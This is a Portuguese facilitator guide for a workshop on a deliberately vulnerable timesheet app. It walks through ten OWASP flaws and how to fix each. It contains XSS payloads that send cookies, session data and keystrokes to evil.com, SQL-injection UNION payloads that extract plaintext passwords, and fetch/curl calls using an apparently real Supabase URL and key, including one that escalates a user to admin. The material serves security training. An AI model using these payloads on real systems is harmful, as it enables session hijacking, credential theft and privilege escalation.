# 🔓 Workshop de Cybersecurity — Guia de Vulnerabilidades

> ⚠️ **Este documento é CONFIDENCIAL** e deve ser entregue apenas ao facilitador do workshop.  
> Os participantes devem descobrir e explorar as vulnerabilidades sem acesso a este guia.

---

## Visão Geral

A aplicação **Kronos.io Timesheet** é um sistema de ponto digital funcional construído com React + Vite + Supabase. Ela contém **10 vulnerabilidades intencionais** mapeadas ao OWASP Top 10.

| # | Vulnerabilidade | OWASP | Dificuldade |
|---|----------------|-------|-------------|
| 1 | Stored XSS | A03:2021 – Injection | 🟢 Fácil |
| 2 | Reflected XSS | A03:2021 – Injection | 🟢 Fácil |
| 3 | SQL Injection (via RPC) | A03:2021 – Injection | 🟡 Médio |
| 4 | IDOR (Insecure Direct Object Reference) | A01:2021 – Broken Access Control | 🟢 Fácil |
| 5 | Broken Authentication | A07:2021 – Identification & Auth Failures | 🟡 Médio |
| 6 | Sensitive Data Exposure | A02:2021 – Cryptographic Failures | 🟢 Fácil |
| 7 | Mass Assignment | A01:2021 – Broken Access Control | 🟡 Médio |
| 8 | Missing Input Validation | A03:2021 – Injection | 🟢 Fácil |
| 9 | Security Misconfiguration | A05:2021 – Security Misconfiguration | 🟢 Fácil |
| 10 | Insecure Data Storage (Client-side) | A04:2021 – Insecure Design | 🟢 Fácil |

---

## 1. 🟢 Stored XSS (Cross-Site Scripting Persistente)

### Localização
- **Página**: Solicitações (`/requests`)
- **Campo**: "Justificativa" no formulário de nova solicitação
- **Código vulnerável**: `src/pages/Requests.jsx` linha com `dangerouslySetInnerHTML`

### Passo a Passo para Explorar

1. Acesse a aplicação e faça login com `kenzo@kronos.io` / `admin123`
2. Navegue até **Solicitações** no menu lateral
3. No formulário "Nova Solicitação", preencha:
   - **Data**: Qualquer data
   - **Tipo**: Hora Extra
   - **Início/Fim**: Qualquer horário
   - **Justificativa**: Cole este payload:
   ```html
   <img src=x onerror="alert('XSS! Cookie: '+document.cookie)">
   ```
4. Clique em **"Enviar Solicitação"**
5. A tabela de "Solicitações Recentes" será atualizada e o alerta será executado no navegador
6. **Todos** os usuários que acessarem esta página verão o alerta

### Payloads Alternativos
```html
<!-- Roubo de cookies -->
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

<!-- Redirect malicioso -->
<img src=x onerror="window.location='https://evil.com/phishing'">

<!-- Keylogger -->
<img src=x onerror="document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}">
```

### Como Corrigir
- **Nunca** usar `dangerouslySetInnerHTML` com dados de usuário
- Usar `{text}` em JSX (React escapa HTML por padrão)
- Implementar sanitização com DOMPurify

---

## 2. 🟢 Reflected XSS

### Localização
- **Componente**: Header (`src/components/Header.jsx`)
- **Campo**: Parâmetro `?q=` na URL

### Passo a Passo para Explorar

1. Faça login na aplicação normalmente
2. Na barra de endereço do navegador, adicione ao URL:
   ```
   http://localhost:5173/?q=<img src=x onerror=alert('Reflected_XSS')>
   ```
3. O parâmetro `q` é renderizado no header via `dangerouslySetInnerHTML`
4. O alerta será exibido imediatamente

### Cenário de Ataque Real
Um atacante poderia enviar este link por e-mail a um funcionário:
```
https://kronos.empresa.com/?q=<script>document.location='https://evil.com/steal?token='+localStorage.getItem('kronos_user')</script>
```

### Como Corrigir
- Nunca renderizar parâmetros da URL como HTML
- Usar `textContent` ou JSX `{query}` ao invés de `dangerouslySetInnerHTML`

---

## 3. 🟡 SQL Injection (via Supabase RPC)

### Localização
- **Página**: Relatórios (`/analytics`)
- **Campo**: Filtro de "Contrato" no card de filtros
- **Função vulnerável**: `search_entries` no Supabase (definida em `supabase_schema.sql`)

### Passo a Passo para Explorar

1. Navegue até **Relatórios**
2. No campo **"Contrato"**, digite:
   ```sql
   ' OR 1=1 --
   ```
3. Clique em **"Buscar"**
4. A tabela exibirá **TODOS** os registros de **TODOS** os usuários, não apenas os seus

### Payloads Avançados
```sql
-- Ver dados de todos os usuários
' UNION SELECT * FROM analytics_logs WHERE 1=1 --

-- Extrair dados da tabela profiles (senhas em texto puro!)
' UNION SELECT id, user_id, log_date, document, email, full_name, password_plain, role, '00:00'::time, '00:00'::time, 0 FROM profiles --
```

> **Nota**: O payload UNION requer que o número de colunas corresponda. A função `search_entries` retorna o tipo `analytics_logs`, então o UNION precisa ter colunas compatíveis.

### Como Corrigir
- Usar **queries parametrizadas** (prepared statements)
- Nunca concatenar strings em SQL
- Substituir a função RPC por:
```sql
CREATE OR REPLACE FUNCTION search_entries_safe(search_term TEXT)
RETURNS SETOF analytics_logs AS $$
  SELECT * FROM analytics_logs 
  WHERE contract ILIKE '%' || search_term || '%'
  -- O PostgreSQL parametriza isso automaticamente quando usado corretamente
$$ LANGUAGE sql SECURITY DEFINER;
```

---

## 4. 🟢 IDOR (Insecure Direct Object Reference)

### Localização
- **Página**: Relatórios (`/analytics`)
- **Parâmetro**: `?user_id=` na URL

### Passo a Passo para Explorar

1. Faça login como `kenzo@kronos.io`
2. Navegue até **Relatórios** — você verá apenas seus lançamentos
3. Agora altere a URL para:
   ```
   http://localhost:5173/analytics?user_id=b2c3d4e5-f6a7-8901-bcde-f12345678901
   ```
4. A página exibirá os lançamentos de **Maria Silva** (outro usuário)
5. Tente com outros IDs:
   ```
   http://localhost:5173/analytics?user_id=c3d4e5f6-a7b8-9012-cdef-123456789012
   ```
   Isso mostrará os dados de **João Santos**

### Como Descobrir IDs de Outros Usuários
No console do DevTools do navegador:
```javascript
// A anon key do Supabase permite consultar a tabela profiles diretamente!
const resp = await fetch('https://fadssbqbeogalkcxxgdd.supabase.co/rest/v1/profiles?select=id,email,full_name,role', {
  headers: {
    'apikey': 'sb_publishable_u2nMjYCae0No25wHyRxEOA_vft8QSQH',
    'Authorization': 'Bearer sb_publishable_u2nMjYCae0No25wHyRxEOA_vft8QSQH'
  }
});
console.log(await resp.json());
```

### Como Corrigir
- Implementar Row Level Security (RLS) no Supabase
- Nunca aceitar `user_id` como parâmetro da URL — usar o ID da sessão autenticada
- Validar server-side que o usuário só acessa seus próprios dados

---

## 5. 🟡 Broken Authentication

### Localização
- **Arquivo**: `src/context/AuthContext.jsx`

### Passo a Passo para Explorar

#### 5a. Senhas em Texto Puro
1. Abra o DevTools (F12) → Console
2. Execute:
```javascript
const resp = await fetch('https://fadssbqbeogalkcxxgdd.supabase.co/rest/v1/profiles?select=email,password_plain,role', {
  headers: {
    'apikey': 'sb_publishable_u2nMjYCae0No25wHyRxEOA_vft8QSQH',
    'Authorization': 'Bearer sb_publishable_u2nMjYCae0No25wHyRxEOA_vft8QSQH'
  }
});
console.table(await resp.json());
```
3. Todas as senhas de todos os usuários serão exibidas em texto puro

#### 5b. Sem Rate Limiting
1. Tente fazer login com senhas erradas repetidamente
2. Não há limite de tentativas — permite brute force

#### 5c. Sem Complexidade de Senha
- O sistema aceita qualquer senha. Veja os seeds: `admin123`, `senha123`, `joao2026`

### Como Corrigir
- Usar Supabase Auth (bcrypt + JWT nativos)
- Implementar rate limiting
- Exigir requisitos mínimos de senha (8+ chars, maiúscula, número, especial)

---

## 6. 🟢 Sensitive Data Exposure

### Localização
- **LocalStorage** e **API responses**

### Passo a Passo para Explorar

1. Faça login normalmente
2. Abra DevTools (F12) → **Application** → **Local Storage** → `http://localhost:5173`
3. Clique na chave `kronos_user`
4. Verá o objeto completo do usuário, incluindo:
   - `password_plain`: senha em texto puro
   - `role`: papel do usuário
   - `id`: UUID completo
   - Todos os campos sensíveis

### Como Corrigir
- Nunca armazenar dados sensíveis no localStorage
- Filtrar campos sensíveis antes de retornar ao frontend
- Usar httpOnly cookies para sessão

---

## 7. 🟡 Mass Assignment

### Localização
- **Arquivo**: `src/context/AuthContext.jsx` → função `updateProfile`

### Passo a Passo para Explorar

1. Faça login como `maria@kronos.io` (role: user)
2. Abra DevTools → Console
3. Execute:
```javascript
// Obter o Supabase client
const key = 'sb_publishable_u2nMjYCae0No25wHyRxEOA_vft8QSQH';
const url = 'https://fadssbqbeogalkcxxgdd.supabase.co';

// Promover-se a admin!
const resp = await fetch(`${url}/rest/v1/profiles?id=eq.b2c3d4e5-f6a7-8901-bcde-f12345678901`, {
  method: 'PATCH',
  headers: {
    'apikey': key,
    'Authorization': `Bearer ${key}`,
    'Content-Type': 'application/json',
    'Prefer': 'return=representation'
  },
  body: JSON.stringify({ role: 'admin' })
});
console.log(await resp.json());
```
4. O campo `role` do usuário será alterado de `user` para `admin`

### Como Corrigir
- Implementar whitelist de campos editáveis no backend
- Nunca permitir que o cliente envie campos como `role`, `id`, `created_at`
- Usar RLS policies com validação de campos

---

## 8. 🟢 Missing Input Validation

### Localização
- **Todas** as páginas com formulários

### Passo a Passo para Explorar

1. Navegue até **Solicitações**
2. Envie o formulário com:
   - **Data**: vazio ou data futura absurda (2099-12-31)
   - **Início**: `99:99` (horário inválido)
   - **Fim**: `00:00` (fim antes do início)
   - **Justificativa**: String de 100.000 caracteres
3. Todos esses dados serão aceitos e salvos no banco

### Como Corrigir
- Validação client-side E server-side (nunca confiar apenas no front)
- Usar schemas de validação (Zod, Yup)
- Constraints no banco (CHECK constraints)

---

## 9. 🟢 Security Misconfiguration

### Localização
- Arquivo `.env` e código-fonte

### Passo a Passo para Explorar

1. Abra o DevTools → **Sources** → procure por `supabaseClient`
2. A anon key do Supabase está exposta no bundle JavaScript
3. Verifique o arquivo `.env` no repositório — as credenciais estão commitadas
4. Com a anon key, qualquer pessoa pode acessar a API REST do Supabase diretamente:
```bash
curl "https://fadssbqbeogalkcxxgdd.supabase.co/rest/v1/profiles?select=*" \
  -H "apikey: sb_publishable_u2nMjYCae0No25wHyRxEOA_vft8QSQH" \
  -H "Authorization: Bearer sb_publishable_u2nMjYCae0No25wHyRxEOA_vft8QSQH"
```

### Como Corrigir
- Adicionar `.env` ao `.gitignore`
- Implementar RLS no Supabase (a anon key com RLS é segura)
- Usar variáveis de ambiente no CI/CD, nunca commitar secrets

---

## 10. 🟢 Insecure Data Storage (Client-Side)

### Localização
- `localStorage` → chave `kronos_user`

### Passo a Passo para Explorar

1. Faça login
2. Abra uma nova aba e acesse `javascript:alert(localStorage.getItem('kronos_user'))` 
3. Ou no Console do DevTools:
```javascript
JSON.parse(localStorage.getItem('kronos_user'))
```
4. O token/dados completos do usuário estão acessíveis a qualquer script na página
5. **Combinado com XSS (Vuln #1)**, um atacante pode roubar a sessão completa:
```html
<img src=x onerror="fetch('https://evil.com/steal?data='+btoa(localStorage.getItem('kronos_user')))">
```

### Como Corrigir
- Usar httpOnly cookies (inacessíveis via JavaScript)
- Usar session storage (temporário) ao invés de local storage
- Nunca armazenar dados sensíveis no client

---

## 🎯 Desafios para os Participantes

### Nível Iniciante (🟢)
1. Encontre onde os dados do usuário ficam armazenados no navegador
2. Insira um alerta JavaScript em algum campo de formulário
3. Visualize os dados de ponto de outro colega

### Nível Intermediário (🟡)
4. Extraia as senhas de todos os usuários do sistema
5. Promova sua conta de "user" para "admin"
6. Use SQL Injection para listar dados que não são seus

### Nível Avançado (🔴)
7. Combine XSS + Data Exposure para simular roubo de sessão
8. Crie um script que automatize a extração de dados via API REST
9. Encontre todas as 10 vulnerabilidades e proponha correções para cada uma
10. Monte um relatório de pentest profissional documentando os achados

---

## 📋 Template de Relatório de Pentest

```markdown
# Relatório de Teste de Penetração — Kronos.io

**Data**: ____
**Testador**: ____
**Escopo**: Aplicação web Kronos.io Timesheet

## Sumário Executivo
[Resumo dos achados]

## Vulnerabilidade #X
- **Severidade**: Crítica/Alta/Média/Baixa
- **CVSS Score**: X.X
- **OWASP**: AXX:2021
- **Descrição**: [O que foi encontrado]
- **Evidência**: [Screenshot/payload]
- **Impacto**: [O que um atacante pode fazer]
- **Recomendação**: [Como corrigir]
```
